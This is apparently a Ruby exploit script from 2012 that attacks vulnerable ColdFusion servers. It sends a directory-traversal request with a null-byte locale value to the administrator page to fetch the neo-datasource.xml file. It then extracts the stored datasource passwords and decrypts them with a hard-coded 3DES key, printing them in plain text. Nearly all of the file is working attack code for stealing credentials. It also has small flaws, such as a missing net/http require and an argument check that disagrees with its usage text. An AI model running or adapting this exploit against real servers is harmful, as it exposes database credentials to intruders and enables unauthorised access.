#!/usr/bin/env ruby
# Copyright (c) 2012, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, 
# are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice, this 
#  list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice, 
#  this list of conditions and the following disclaimer in the documentation 
#  and/or other materials provided with the distribution.
#
#  Neither the name of AverageSecurityGuy nor the names of its contributors may
#  be used to endorse or promote products derived from this software without
#  specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND 
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED 
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. 
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, 
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT 
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, 
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, 
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY 
# OF SUCH DAMAGE.

require 'rexml/document'
require 'rextable'
require 'openssl'
require 'base64'

def usage
    puts "cfneo.rb downloads the neo-datasource.xml file from a vulnerable"
	puts "ColdFusion server then parses the file to find the encrypted"
    puts "passwords. The passwords are decrypted and written to stdout."
    puts
    puts "Usage: cfneo.rb server port"
end

def decrypt(cpass)
	des = OpenSSL::Cipher::Cipher.new('des-ede3')
    des.decrypt
    des.key = '0yJ!@1$r8p0L@r1$6yJ!@1rj'
    return des.update(Base64.decode64(cpass)) + des.final
end

def get_passwords(data)
	pwds = Array.new
    data.scan(/\<string\>([a-zA-Z0-9\+\/]+[=]+)\<\/string>/m) do |m|
        pwds << m[0]
	end
    return pwds
end

def download_file(server, port)
	http = Net::HTTP.new(server, port)
	if port == 443 then http.use_ssl = true end

	# These may have to be changed based on the details of the vulnerability
	path = '/CFIDE/administrator/enter.cfm'
	locale = 'locale=../../../../../../../../../../ColdFusion8/lib/neo-datasource.xml%00en'

	# Use the directory traversal to get the neo-datasoure.xml file
	headers = {
		'Host' => server,
		'Content-Type' => 'application/x-www-form-urlencoded',
		'Content-Length' => locale.length.to_s,
	}

	resp, data = http.post(path, locale, headers)
	data =~ /\<title\>(.*)\<\/title\>/m
	return $1
end

#-----------------------------------------------------------------------------
# MAIN
#-----------------------------------------------------------------------------
if ARGV.length < 3 then
    usage
    exit(1)
end

data = download_file(ARGV[0], ARGV[1].to_i)
passwords = get_passwords(data)
tbl = RexTable::Table.new('Columns' => ["Encrypted", "Decrypted"],
			'Header'=> 'Passwords')

passwords.each do |p|
	tbl << [p, decrypt(p)]
end

puts tbl.to_s
